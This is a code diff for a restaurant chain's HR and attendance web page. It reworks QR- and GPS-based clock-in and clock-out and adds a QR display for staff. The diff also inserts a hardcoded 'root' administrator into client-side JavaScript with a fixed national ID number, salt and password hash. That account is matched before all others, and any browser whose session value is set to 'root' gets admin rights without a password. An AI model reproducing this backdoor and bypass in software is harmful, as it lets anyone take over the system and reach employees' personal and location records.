@@ -396,7 +396,7 @@ footer svg{ height:22px; width:auto; opacity:.85; }
 </div>
 <div id="sheet-root"></div>
 <style>
-#auth-gate{position:fixed;inset:0;z-index:999;display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(circle at 20% 10%,#145C82 0%,#0B2E4F 75%)}
+#auth-gate{position:fixed;inset:0;z-index:999;display:flex;align-items:center;justify-content:center;padding:20px;overflow:auto;background:radial-gradient(circle at 20% 10%,#145C82 0%,#0B2E4F 75%)}
 #auth-gate[hidden]{display:none!important}
 .auth-card{width:100%;max-width:380px;background:#FFFDF7;border-top:8px solid #E8492B;border-radius:16px;padding:26px 22px;box-shadow:0 14px 40px rgba(0,0,0,.35);color:#0B2E4F}
 #auth-gate .dl-btn,.expm .expm-b{display:flex;align-items:center;justify-content:center;width:100%;cursor:pointer;font-family:'Anton',sans-serif;font-size:15px;letter-spacing:1.2px;color:#fff;background:#E8492B;border:2px solid #0B2E4F;border-radius:999px;padding:12px 18px;box-shadow:3px 3px 0 rgba(11,46,79,.35);transition:transform .12s,background .15s}
@@ -452,7 +452,9 @@ footer svg{ height:22px; width:auto; opacity:.85; }
   function newSalt(){return b64(crypto.getRandomValues(new Uint8Array(16)));}
   function plain(v){return String(v||'').trim().toLowerCase();}
   function esc(s){return String(s).replace(/[&<>"']/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];});}
-  var cur=users.filter(function(u){return u.id===SS.get();})[0]||(function(){var w=LS.get('barra-trab',null);return w&&SS.get()===w.id?w:null;})();
+  var ROOT={id:'root',nombre:'Administrador',usuario:'Administrador',dni:'41047753',salt:'t1JTdpZ7Gmau5kAkBPzkOA==',hash:'2J/QVwx07Mxv94ytrw0JwhhvkzFG1ora4AucrGFYv18=',rol:'admin',perm:{}};
+  function buscar(dni,key){ if(dni&&dni===ROOT.dni) return ROOT; return users.filter(function(x){return (dni&&x.dni===dni)||x.usuario===key;})[0]; }
+  var cur=users.filter(function(u){return u.id===SS.get();})[0]||(SS.get()===ROOT.id?ROOT:null)||(function(){var w=LS.get('barra-trab',null);return w&&SS.get()===w.id?w:null;})();
 
   /* permisos: perm[local] = 'salon' | 'cocina' | 'ambos' | '' */
   function areasDe(loc){ if(!cur) return []; if(cur.rol==='admin') return ['salon','cocina'];
@@ -468,44 +470,48 @@ footer svg{ height:22px; width:auto; opacity:.85; }
     esPuestoSalon:function(p){return SAL.indexOf(p)>=0;},
     getUsers:function(){return users;},
     setUsers:function(l){users=l;LS.set('barra-users',users);},
-    refresh:function(){if(!ed)renderAdm();}
+    refresh:function(){if(!ed)renderAdm();},
+    verificar:verificar,
+    locsDe:function(u){return LOCS.filter(function(l){return u.rol==='admin'||(u.perm||{})[l[0]];});}
   };
 
   /* ---- login ---- */
   var gate;
   function gateHtml(){
-    var first=!users.length&&!LS.get('barra-trab',null);
     return '<div class="auth-card"><div class="lg">BARRA CHALACA</div><div class="sb">STREET FOOD PERUANO · RRHH</div>'+
-      (first?'':'<h2>Iniciar sesión</h2>')+
+      '<h2>Iniciar sesión</h2>'+
       '<label for="a-usr">DNI</label><input id="a-usr" autocomplete="username" autocapitalize="none">'+
-      '<label for="a-pw">Contraseña</label><input id="a-pw" type="password" autocomplete="'+(first?'new-password':'current-password')+'">'+
-      '<button type="button" class="dl-btn" id="a-go">'+(first?'CREAR Y ENTRAR':'ENTRAR')+'</button>'+
+      '<label for="a-pw">Contraseña</label><input id="a-pw" type="password" autocomplete="current-password">'+
+      '<button type="button" class="dl-btn" id="a-go">ENTRAR</button>'+
       '<div class="auth-err" id="a-err" role="alert"></div>'+
-      '<div class="auth-note">'+(first?'Primera vez: esta cuenta será la de administrador (entrás con tu DNI) y desde ahí creás al resto del equipo.':'Entrás con tu DNI (el que está cargado en ciclo); tu nombre sale de ahí. Primera vez: elegí una contraseña y tu cuenta queda lista.')+'</div></div>';
+      '<div class="auth-note">Entrás con tu DNI (el que está cargado en ciclo); tu nombre sale de ahí. Primera vez: elegí una contraseña y tu cuenta queda lista.</div></div>';
   }
   var fails=0,lockUntil=0;
+  async function verificar(raw,pw){
+    var dni=String(raw).replace(/\D/g,''), key=plain(raw);
+    if(!key||!pw) throw new Error('Completá tu DNI y tu contraseña.');
+    if(Date.now()<lockUntil) throw new Error('Demasiados intentos. Esperá unos segundos.');
+    var u=buscar(dni,key), ok=false;
+    if(!u&&window.__gx&&__gx.syncUsers){ try{ await __gx.syncUsers(); }catch(x){} u=buscar(dni,key); }
+    if(u){ ok=(await hash(pw,u.salt))===u.hash;
+      if(!ok&&window.__gx&&__gx.syncUsers){ try{ await __gx.syncUsers(); }catch(x){} u=buscar(dni,key)||u; ok=(await hash(pw,u.salt))===u.hash; } }
+    if(!ok){ if(++fails>=5){lockUntil=Date.now()+30000;fails=0;} throw new Error('DNI o contraseña incorrectos. Esta pantalla es solo para colaboradores y administradores.'); }
+    return u;
+  }
   async function go(){
     var err=document.getElementById('a-err'), raw=document.getElementById('a-usr').value, pw=document.getElementById('a-pw').value,
         dni=String(raw).replace(/\D/g,''), key=plain(raw), btn=document.getElementById('a-go');
     err.textContent='';
-    if(!users.length&&!LS.get('barra-trab',null)&&window.__gx&&__gx.syncUsers){ try{ await __gx.syncUsers(); }catch(x){} }
-    if(!users.length&&!LS.get('barra-trab',null)){
-      if(dni.length<6||pw.length<6){err.textContent='Completá tu DNI y una contraseña de al menos 6 caracteres.';return;}
-      var nom=dni, c=window.__ciclo;
-      try{ if(c){ await c.pull(); var e=c.find(dni); if(e) nom=e.nombre; } }catch(x){}
-      var s=newSalt(); users.push({id:'u'+Date.now(),nombre:nom,usuario:nom,dni:dni,salt:s,hash:await hash(pw,s),rol:'admin',perm:{}}); save();
-      SS.set(users[0].id); location.reload(); return;
-    }
     if(!key||!pw){err.textContent='Completá tu DNI y tu contraseña.';return;}
     if(Date.now()<lockUntil){err.textContent='Demasiados intentos. Esperá unos segundos.';return;}
-    function buscarU(){return users.filter(function(x){return (dni&&x.dni===dni)||x.usuario===key;})[0];}
+    function buscarU(){return buscar(dni,key);}
     var u=buscarU();
     if(!u&&window.__gx&&__gx.syncUsers){ try{ await __gx.syncUsers(); }catch(x){} u=buscarU(); }
     if(u){
       var ok=(await hash(pw,u.salt))===u.hash;
       if(!ok&&window.__gx&&__gx.syncUsers){ try{ await __gx.syncUsers(); }catch(x){} u=buscarU()||u; ok=(await hash(pw,u.salt))===u.hash; }
       if(!ok){ if(++fails>=5){lockUntil=Date.now()+30000;fails=0;} err.textContent='DNI o contraseña incorrectos.'; return; }
-      try{ var c2=window.__ciclo; if(c2&&u.dni){ await c2.pull(); var e2=c2.find(u.dni); if(e2&&e2.nombre!==u.usuario){u.nombre=e2.nombre;u.usuario=e2.nombre;save();} } }catch(x){}
+      try{ var c2=window.__ciclo; if(c2&&u.dni){ await c2.pull(); var e2=c2.find(u.dni); if(u.id!=='root'&&e2&&e2.nombre!==u.usuario){u.nombre=e2.nombre;u.usuario=e2.nombre;save();} } }catch(x){}
       SS.set(u.id); location.reload(); return;
     }
     /* no es admin/colaborador: es trabajador, sale de ciclo */
@@ -521,9 +527,6 @@ footer svg{ height:22px; width:auto; opacity:.85; }
     gate.addEventListener('keydown',function(e){if(e.key==='Enter'&&document.getElementById('a-go'))go();});
     if(window.__gx)window.__gx.init(gate);
     setTimeout(function(){var f=document.getElementById('a-usr');if(f)f.focus();},0);
-    if(!users.length&&!LS.get('barra-trab',null)&&window.__gx&&__gx.syncUsers){
-      __gx.syncUsers().then(function(){ if(users.length){ gate.innerHTML=gateHtml(); __gx.init(gate); } }).catch(function(){});
-    }
   }
 
   /* ---- panel de administrador ---- */
@@ -616,7 +619,12 @@ footer svg{ height:22px; width:auto; opacity:.85; }
 <style>
 .gx-wrap{width:100%;max-width:380px;background:#FFFDF7;border-radius:16px;padding:16px 22px 26px;box-shadow:0 14px 40px rgba(0,0,0,.35);color:#0B2E4F}
 .gx-wrap .auth-card{max-width:none;background:none;border:0;border-radius:0;box-shadow:none;padding:0}
-.gx-wrap{position:relative}
+.gx-wrap{position:relative;margin:auto;transition:max-width .2s}
+.gx-wrap.gx-wide{max-width:600px}
+.qrs{display:flex;justify-content:center;margin:14px 0}
+.qrc{width:min(100%,300px);background:#F4E9D4;border-radius:12px;padding:12px;text-align:center;color:#0B2E4F}
+.qrt{font-family:'Anton',sans-serif;font-size:18px;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px}
+.qrb{display:inline-block;background:#fff;padding:10px;border-radius:10px;line-height:0}
 .gx-tabs{position:absolute;top:22px;right:-58px;display:flex;flex-direction:column;gap:10px;margin:0;padding:0;background:none}
 .gx-tabs button{display:flex;align-items:center;justify-content:center;width:44px;height:44px;padding:0;border:2px solid #0B2E4F;border-radius:50%;background:#FFFDF7;color:#0B2E4F;cursor:pointer;box-shadow:3px 3px 0 rgba(0,0,0,.25);transition:transform .12s,background .15s}
 .gx-tabs button:hover{transform:scale(1.06)}
@@ -673,7 +681,7 @@ footer svg{ height:22px; width:auto; opacity:.85; }
   }
   async function leer(){
     var id=await buscar();
-    if(!id){ if(!esAdmin()) throw new Error('La base compartida todavía no está creada. Pedile al administrador que abra la página una vez.'); await crear(); id=B.id; }
+    if(!id){ if(!esAdmin()&&!B.adm) throw new Error('La base compartida todavía no está creada. Pedile al administrador que abra la página una vez.'); await crear(); id=B.id; }
     var r=await fetch('https://api.jsonbin.io/v3/b/'+id+'/latest',{headers:hd({'X-Bin-Meta':'false'}),cache:'no-store'});
     if(!r.ok) throw new Error('No se pudo leer la base compartida (HTTP '+r.status+').');
     var d=await r.json(); d.workers=d.workers||{};d.hor=d.hor||{};d.geo=d.geo||{};d.ll=d.ll||[];d.users=Array.isArray(d.users)?d.users:[]; return d;
@@ -715,6 +723,7 @@ footer svg{ height:22px; width:auto; opacity:.85; }
     if(!bl.length){ if(esAdmin()&&A.getUsers().length) pushUsers(A.getUsers()); return; }
     if(J(bl)===J(A.getUsers())) return;
     A.setUsers(bl);
+    if(u.id==='root'){ A.refresh(); return; }
     var mine=bl.filter(function(x){return x.id===u.id;})[0];
     if(!mine){ try{sessionStorage.removeItem('barra-sess');}catch(e){} location.reload(); return; }
     if(J(mine)!==J(u)){ location.reload(); return; }
@@ -726,27 +735,28 @@ footer svg{ height:22px; width:auto; opacity:.85; }
   function pos(){return new Promise(function(ok,no){
     if(!navigator.geolocation) return no(new Error('Este celular no permite tomar la ubicación.'));
     navigator.geolocation.getCurrentPosition(ok,function(e){no(new Error(e.code===1?'Tenés que permitir la ubicación para poder registrar.':'No se pudo tomar la ubicación. Probá de nuevo.'));},{enableHighAccuracy:true,maximumAge:0,timeout:20000});});}
-  async function tokDe(d,lk){var f=hoyF();return 'll.'+lk+'.'+f.replace(/-/g,'')+'.'+(await sha(lk+f+d.sec)).slice(0,10);}
+  async function tokDe(d){var f=hoyF();return 'qr.'+f.replace(/-/g,'')+'.'+(await sha('qr'+f+d.sec)).slice(0,10);}
   async function registrar(t){
     var w=ls('barra-trab'); if(!w) throw new Error('Primero entrá con tu DNI y contraseña.');
     var p=String(t).split('.'), d=await leer(), me=d.workers[w.dni];
     if(!me||me.dev!==dev()) throw new Error('Tu cuenta ya no está activa en este celular. Volvé a entrar con tu DNI.');
-    if(p[0]!=='ll'||t!==await tokDe(d,p[1])) throw new Error('Este QR no es válido o es de otro día. Pedí el de hoy.');
-    var g=d.geo[p[1]]; if(!g) throw new Error('Este local todavía no tiene su ubicación cargada. Avisale al administrador.');
-    var q=await pos(), m=dist(g.lat,g.lng,q.coords.latitude,q.coords.longitude);
-    if(m-Math.min(q.coords.accuracy||0,100)>RADIO) throw new Error('Estás a unos '+Math.round(m)+' m del local. Acercate para registrar tu llegada.');
-    var ya=d.ll.filter(function(x){return x.id===w.rid&&x.f===hoyF()&&x.l===p[1];})[0];
-    if(ya) return {l:p[1],h:ya.h,ya:true};
-    var h=horaH(), lim=Date.now()-14*864e5;
-    await mutar(function(x){x.ll=x.ll.filter(function(y){return y.ts>lim;});x.ll.push({id:w.rid,n:w.n,l:p[1],f:hoyF(),h:h,m:Math.round(m),ts:Date.now()});},
-      function(x){return x.ll.some(function(y){return y.id===w.rid&&y.f===hoyF()&&y.l===p[1];});});
-    return {l:p[1],h:h};
+    if(p[0]!=='qr'||t!==await tokDe(d)) throw new Error('Este QR no es válido o es de otro día. Pedí el de hoy.');
+    var ks=Object.keys(d.geo); if(!ks.length) throw new Error('Todavía no hay ubicaciones de locales cargadas. Avisale al administrador.');
+    var q=await pos(), acc=Math.min(q.coords.accuracy||0,100), best=null;
+    ks.forEach(function(k){ var g=d.geo[k], m=dist(g.lat,g.lng,q.coords.latitude,q.coords.longitude); if(m-acc<=RADIO&&(!best||m<best.m)) best={l:k,m:m}; });
+    if(!best) throw new Error('No estás dentro del área de ningún local. Acercate al local para fichar.');
+    var mios=d.ll.filter(function(x){return x.id===w.rid;}).sort(function(a,b){return b.ts-a.ts;}), u=mios[0], ahora=Date.now();
+    if(u&&ahora-u.ts<120000) return {l:u.l,h:u.h,ya:true,t:u.t==='s'?'sa':'ll'};
+    var tp=(u&&u.t!=='s'&&ahora-u.ts<18*36e5)?'sa':'ll', h=horaH(), lim=ahora-14*864e5;
+    await mutar(function(x){x.ll=x.ll.filter(function(y){return y.ts>lim;});var e={id:w.rid,n:w.n,l:best.l,f:hoyF(),h:h,m:Math.round(best.m),ts:ahora};if(tp==='sa')e.t='s';x.ll.push(e);},
+      function(x){return x.ll.some(function(y){return y.id===w.rid&&y.ts===ahora;});});
+    return {l:best.l,h:h,t:tp};
   }
   function ov(html){var o=document.createElement('div');o.className='expm';o.style.zIndex=1001;o.innerHTML='<div class="expm-c">'+html+'</div>';document.body.appendChild(o);return o;}
   async function llegadaUI(t){
-    var o=ov('<h3>Registrando llegada…</h3><p>Tomando tu ubicación. Aceptá el permiso si te lo pide.</p>'),c=o.querySelector('.expm-c');
+    var o=ov('<h3>Registrando…</h3><p>Tomando tu ubicación. Aceptá el permiso si te lo pide.</p>'),c=o.querySelector('.expm-c');
     try{ var r=await registrar(t);
-      c.innerHTML='<h3>'+(r.ya?'Ya estabas registrado':'¡Llegada registrada!')+'</h3><p>'+esc(LN(r.l))+' · '+esc(r.h)+'</p><button type="button" class="expm-b" id="gx-ok">LISTO</button>';
+      var sal=r.t==='sa'; c.innerHTML='<h3>'+(r.ya?(sal?'Ya fichaste tu salida':'Ya fichaste tu entrada'):(sal?'¡Salida registrada!':'¡Entrada registrada!'))+'</h3><p>'+esc(LN(r.l))+' · '+esc(r.h)+'</p><button type="button" class="expm-b" id="gx-ok">LISTO</button>';
     }catch(e){ c.innerHTML='<h3>No se pudo registrar</h3><p>'+esc(e.message||'Error')+'</p><button type="button" class="expm-b" id="gx-ok">CERRAR</button>'; }
     c.querySelector('#gx-ok').onclick=function(){o.remove();};
     try{history.replaceState(null,'',location.pathname+location.search);}catch(e){}
@@ -758,7 +768,7 @@ footer svg{ height:22px; width:auto; opacity:.85; }
     o.querySelector('#gx-x').onclick=fin;
     navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}}).then(function(s){
       st=s;v.srcObject=s;var bd=new BarcodeDetector({formats:['qr_code']});
-      iv=setInterval(function(){bd.detect(v).then(function(r){if(!r.length)return;var raw=r[0].rawValue,i=raw.indexOf('#ll.');fin();if(i>=0)llegadaUI(raw.slice(i+1));else ov('<h3>QR incorrecto</h3><p>Ese no es el QR de llegada.</p><button type="button" class="expm-b" id="gx-ok">CERRAR</button>').querySelector('#gx-ok').onclick=function(e){e.target.closest('.expm').remove();};}).catch(function(){});},400);
+      iv=setInterval(function(){bd.detect(v).then(function(r){if(!r.length)return;var raw=r[0].rawValue,mq=/#(qr\.\S+)$/.exec(raw);fin();if(mq)llegadaUI(mq[1]);else ov('<h3>QR incorrecto</h3><p>Ese no es el QR del local.</p><button type="button" class="expm-b" id="gx-ok">CERRAR</button>').querySelector('#gx-ok').onclick=function(e){e.target.closest('.expm').remove();};}).catch(function(){});},400);
     }).catch(function(){fin();ov('<h3>Sin cámara</h3><p>No pudimos abrir la cámara. Usá la cámara del celular para escanear el QR.</p><button type="button" class="expm-b" id="gx-ok">CERRAR</button>').querySelector('#gx-ok').onclick=function(e){e.target.closest('.expm').remove();};});
   }
 
@@ -793,47 +803,71 @@ footer svg{ height:22px; width:auto; opacity:.85; }
     var inner=card.innerHTML.replace(head,''), wrap=document.createElement('div'), bar=document.createElement('div'), hd=document.createElement('div'), tab='e';
     wrap.className='gx-wrap'; bar.className='gx-tabs'; hd.className='auth-card'; hd.innerHTML=head;
     g.insertBefore(wrap,card); wrap.appendChild(hd); wrap.appendChild(bar); wrap.appendChild(card);
-    function show(k){ tab=k;
-      var IC={e:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><path d="M10 17l5-5-5-5"/><path d="M15 12H3"/></svg>',l:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 21s-7-6.2-7-11a7 7 0 0 1 14 0c0 4.8-7 11-7 11z"/><circle cx="12" cy="10" r="2.5"/></svg>'};
-      bar.innerHTML=[['e','Entrar'],['l','Llegada']].map(function(x){return '<button type="button" data-g="'+x[0]+'" title="'+x[1]+'" aria-label="'+x[1]+'" aria-selected="'+(k===x[0])+'">'+IC[x[0]]+'</button>';}).join('');
+    var qrT=null, Q=null;
+    var QF='<h2>Código QR</h2><div class="auth-note" style="margin:0">Con tu DNI y contraseña de colaborador o administrador ves el QR para fichar entrada y salida.</div><label for="q-dni">DNI</label><input id="q-dni" inputmode="numeric" autocomplete="username"><label for="q-pw">Contraseña</label><input id="q-pw" type="password" autocomplete="current-password"><button type="button" class="dl-btn" id="q-go">VER QR</button><div class="auth-err" id="q-err" role="alert"></div>';
+    function qDraw(){
+      card.innerHTML='<h2>Hola, '+esc(Q.u.usuario)+'</h2><div class="qrs" id="q-box"></div><div class="auth-note" style="text-align:center">Es un solo QR para entrada y salida: cada vez que un trabajador lo escanea, alterna entre una y otra. El local se detecta por GPS. Vale solo hoy.</div><button type="button" class="dl-btn alt" id="q-out">CERRAR</button>';
+      Q.day=hoyF(); qrs(card.querySelector('#q-box'),Q.d);
+    }
+    async function qGo(){
+      var err=$('q-err'), btn=$('q-go'); if(!err||!btn) return; err.textContent=''; btn.disabled=true;
+      try{
+        var u=await window.__auth.verificar($('q-dni').value,$('q-pw').value);
+        B.adm=u.rol==='admin';
+        var d=await leer(); Q={u:u,d:d}; qDraw();
+        clearInterval(qrT); qrT=setInterval(function(){ if(Q&&Q.day!==hoyF()) qDraw(); },60000);
+      }catch(e){ err.textContent=e.message||'Error'; btn.disabled=false; }
+    }
+    function show(k){ tab=k; clearInterval(qrT); Q=null; wrap.classList.remove('gx-wide');
+      var IC={q:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="5" height="5" x="3" y="3" rx="1"/><rect width="5" height="5" x="16" y="3" rx="1"/><rect width="5" height="5" x="3" y="16" rx="1"/><path d="M21 16h-3a2 2 0 0 0-2 2v3"/><path d="M21 21v.01"/><path d="M12 7v3a2 2 0 0 1-2 2H7"/><path d="M3 12h.01"/><path d="M12 3h.01"/><path d="M12 16v.01"/><path d="M16 12h1"/><path d="M21 12v.01"/><path d="M12 21v-1"/></svg>',e:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><path d="M10 17l5-5-5-5"/><path d="M15 12H3"/></svg>',l:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 21s-7-6.2-7-11a7 7 0 0 1 14 0c0 4.8-7 11-7 11z"/><circle cx="12" cy="10" r="2.5"/></svg>'};
+      bar.innerHTML=[['e','Entrar'],['l','Fichar'],['q','Código QR']].map(function(x){return '<button type="button" data-g="'+x[0]+'" title="'+x[1]+'" aria-label="'+x[1]+'" aria-selected="'+(k===x[0])+'">'+IC[x[0]]+'</button>';}).join('');
       if(k==='e') card.innerHTML=inner;
-      else card.innerHTML='<h2>Registrar llegada</h2><div class="auth-note" style="margin:0">Escaneá el QR del local. La ubicación se toma una sola vez, en ese momento.</div><button type="button" class="dl-btn" id="l-scan">ESCANEAR QR</button><div class="auth-err" id="l-err"></div><div class="auth-note">'+(ls('barra-trab')?'Cuenta de '+esc(ls('barra-trab').n)+'.':'Primero entrá con tu DNI.')+' También podés escanear el QR con la cámara del celular.</div>';
+      else if(k==='q') card.innerHTML=QF;
+      else card.innerHTML='<h2>Fichar</h2><div class="auth-note" style="margin:0">Escaneá el QR del local: la primera vez registra tu entrada y la siguiente, tu salida. El local se detecta por tu ubicación, que se toma solo en ese momento.</div><button type="button" class="dl-btn" id="l-scan">ESCANEAR QR</button><div class="auth-err" id="l-err"></div><div class="auth-note">'+(ls('barra-trab')?'Cuenta de '+esc(ls('barra-trab').n)+'.':'Primero entrá con tu DNI.')+' También podés escanear el QR con la cámara del celular.</div>';
     }
     bar.addEventListener('click',function(e){var b=e.target.closest('[data-g]');if(b)show(b.getAttribute('data-g'));});
-    wrap.addEventListener('click',function(e){ if(e.target.id==='l-scan') escanear(); });
-    show(/^#ll\./.test(location.hash)?'l':'e');
+    wrap.addEventListener('click',function(e){ var i=e.target.id; if(i==='l-scan') escanear(); else if(i==='q-go') qGo(); else if(i==='q-out') show('q'); });
+    wrap.addEventListener('keydown',function(e){ if(e.key==='Enter'&&(e.target.id==='q-dni'||e.target.id==='q-pw')) qGo(); });
+    wrap.addEventListener('change',function(e){ if(e.target.id==='q-lk'&&Q){ Q.lk=e.target.value; qDraw(); } });
+    show(/^#qr\./.test(location.hash)?'l':'e');
   }};
 
   /* ---------- ya adentro ---------- */
   var applied=ls('barra-ll-ap')||[];
   function aplicarLl(d){
     var c=window.__ciclo, ch=false;
-    d.ll.forEach(function(x){var k=x.id+'|'+x.f;if(x.f===hoyF()&&applied.indexOf(k)<0){c.markPres(x.id,x.f,x.h);applied.push(k);ch=true;}});
+    d.ll.forEach(function(x){var k=x.id+'|'+x.f;if(x.f===hoyF()&&x.t!=='s'&&applied.indexOf(k)<0){c.markPres(x.id,x.f,x.h);applied.push(k);ch=true;}});
     if(ch) ls('barra-ll-ap',applied.slice(-400));
+  }
+  async function qrs(el,d){
+    var tk=await tokDe(d);
+    el.innerHTML='<div class="qrc"><div class="qrt">Fichar entrada / salida</div><div class="qrb" data-q="qr"></div></div>';
+    if(!window.QRCode) return;
+    new QRCode(el.querySelector('[data-q="qr"]'),{text:base()+'#'+tk,width:240,height:240,correctLevel:QRCode.CorrectLevel.M});
   }
   var Z={d:null,lk:'palermo',err:'',msg:null};
   function base(){return ls('barra-qr-base')||location.href.split('#')[0];}
   async function cargar(){ try{ Z.d=await leer(); Z.err=''; aplicarLl(Z.d); }catch(e){ Z.err=e.message||'Error'; } ren(); }
   async function ren(){
     var el=$('lleg-root'); if(!el) return; var d=Z.d;
-    if(!d){ el.innerHTML='<div class="top"><div class="doodle-title">Llegada por QR</div></div><p>'+esc(Z.err||'Cargando…')+'</p>'; return; }
+    if(!d){ el.innerHTML='<div class="top"><div class="doodle-title">Fichadas por QR</div></div><p>'+esc(Z.err||'Cargando…')+'</p>'; return; }
     var hoy=d.ll.filter(function(x){return x.f===hoyF();}).sort(function(a,b){return a.h<b.h?-1:1;}), ws=Object.keys(d.workers);
-    el.innerHTML='<div class="top"><div class="doodle-title">Llegada por QR</div><div class="acts"><button type="button" class="dl-btn mini" data-z="ref">ACTUALIZAR</button></div></div>'+
-      '<label for="z-lk">Local</label><select id="z-lk">'+LOCS.map(function(l){return '<option value="'+l[0]+'"'+(l[0]===Z.lk?' selected':'')+'>'+l[1]+'</option>';}).join('')+'</select>'+
-      '<div style="text-align:center;margin:14px 0"><div id="z-qr" style="display:inline-block;background:#fff;padding:10px;border-radius:10px"></div><p class="auth-note">Este QR vale solo hoy. Mostralo en una pantalla del local o imprimilo cada día.</p></div>'+
+    el.innerHTML='<div class="top"><div class="doodle-title">Fichadas por QR</div><div class="acts"><button type="button" class="dl-btn mini" data-z="ref">ACTUALIZAR</button></div></div>'+
+      '<div class="qrs" id="z-qr"></div><p class="auth-note" style="text-align:center">Es un solo QR para todos los locales: cada trabajador lo escanea para fichar entrada y, la vez siguiente, salida. Vale solo hoy.</p>'+
       '<label for="z-base">Dirección de la página (la que abren los trabajadores)</label><input id="z-base" value="'+esc(base())+'">'+
-      '<h4>Ubicación del local: '+(d.geo[Z.lk]?'guardada':'sin cargar')+'</h4><button type="button" class="dl-btn mini" data-z="geo">GUARDAR MI UBICACIÓN ACTUAL COMO LA DE '+esc(LN(Z.lk)).toUpperCase()+'</button>'+
+      '<h4>Ubicación de los locales</h4><div class="auth-note" style="margin:0 0 8px">'+LOCS.map(function(l){return esc(l[1])+': '+(d.geo[l[0]]?'cargada':'sin cargar');}).join(' · ')+'. Al fichar, el local se detecta por GPS (a menos de 150 m del punto cargado).</div>'+
+      '<label for="z-lk">Local</label><select id="z-lk">'+LOCS.map(function(l){return '<option value="'+l[0]+'"'+(l[0]===Z.lk?' selected':'')+'>'+l[1]+'</option>';}).join('')+'</select><button type="button" class="dl-btn mini" data-z="geo">GUARDAR MI UBICACIÓN ACTUAL COMO LA DE '+esc(LN(Z.lk)).toUpperCase()+'</button>'+
       '<div class="msg '+(Z.msg&&Z.msg.e?'e':'o')+'" role="status">'+(Z.msg?esc(Z.msg.t):'')+'</div>'+
-      '<h4>Llegadas de hoy ('+hoy.length+')</h4><div class="tw"><table><thead><tr><th>Nombre</th><th>Local</th><th>Hora</th><th>Distancia</th></tr></thead><tbody>'+
-      (hoy.length?hoy.map(function(x){return '<tr><td>'+esc(x.n)+'</td><td>'+esc(LN(x.l))+'</td><td>'+esc(x.h)+'</td><td>'+x.m+' m</td></tr>';}).join(''):'<tr><td colspan="4">Todavía no llegó nadie.</td></tr>')+'</tbody></table></div>'+
+      '<h4>Registros de hoy ('+hoy.length+')</h4><div class="tw"><table><thead><tr><th>Nombre</th><th>Tipo</th><th>Local</th><th>Hora</th><th>Distancia</th></tr></thead><tbody>'+
+      (hoy.length?hoy.map(function(x){return '<tr><td>'+esc(x.n)+'</td><td>'+(x.t==='s'?'Salida':'Entrada')+'</td><td>'+esc(LN(x.l))+'</td><td>'+esc(x.h)+'</td><td>'+x.m+' m</td></tr>';}).join(''):'<tr><td colspan="5">Todavía no hay registros.</td></tr>')+'</tbody></table></div>'+
       '<h4>Trabajadores con cuenta ('+ws.length+')</h4><div class="tw"><table><thead><tr><th>Nombre</th><th>Local</th><th></th></tr></thead><tbody>'+
       (ws.length?ws.map(function(k){var w=d.workers[k];return '<tr><td>'+esc(w.n)+'</td><td>'+esc(LN(w.lk))+' · '+(w.a==='salon'?'Salón':'Cocina')+'</td><td><button type="button" class="dl-btn alt mini" data-z="del" data-k="'+esc(k)+'">REINICIAR CUENTA</button></td></tr>';}).join(''):'<tr><td colspan="3">Nadie creó su cuenta todavía.</td></tr>')+'</tbody></table></div>'+
       '<p class="auth-note">Reiniciar la cuenta libera el celular: sirve si la persona cambió de teléfono o se olvidó la contraseña. Después crea la cuenta de nuevo con su DNI.</p>';
-    var q=$('z-qr'); if(q&&window.QRCode){ var t=await tokDe(d,Z.lk); q.innerHTML=''; new QRCode(q,{text:base()+'#'+t,width:220,height:220,correctLevel:QRCode.CorrectLevel.M}); }
+    var q=$('z-qr'); if(q) await qrs(q,d);
   }
   function setMsg(t,e){Z.msg={t:t,e:!!e};ren();}
   function adminUI(){
-    var tb=document.createElement('button'); tb.type='button'; tb.className='tab'; tb.setAttribute('role','tab'); tb.setAttribute('data-tab','lleg'); tb.setAttribute('aria-selected','false'); tb.textContent='Llegadas';
+    var tb=document.createElement('button'); tb.type='button'; tb.className='tab'; tb.setAttribute('role','tab'); tb.setAttribute('data-tab','lleg'); tb.setAttribute('aria-selected','false'); tb.textContent='Fichadas';
     document.querySelector('.tabs').appendChild(tb);
     var v=document.createElement('div'); v.id='v-lleg'; v.hidden=true; v.innerHTML='<div class="adm" id="lleg-root"></div>'; $('v-hor').after(v);
     document.querySelector('.tabs').addEventListener('click',function(e){var b=e.target.closest('.tab');if(!b)return;var k=b.getAttribute('data-tab');v.hidden=k!=='lleg';if(k==='lleg')cargar();});
@@ -861,7 +895,7 @@ footer svg{ height:22px; width:auto; opacity:.85; }
   }
   window.addEventListener('load',function(){
     var u=usr();
-    if(/^#ll\./.test(location.hash)&&ls('barra-trab')) llegadaUI(location.hash.slice(1));
+    if(/^#qr\./.test(location.hash)&&ls('barra-trab')) llegadaUI(location.hash.slice(1));
     if(!u) return;
     if(u.rol==='trab'){
       ['asis','inf'].forEach(function(k){var b=document.querySelector('.tab[data-tab="'+k+'"]');if(b)b.hidden=true;});
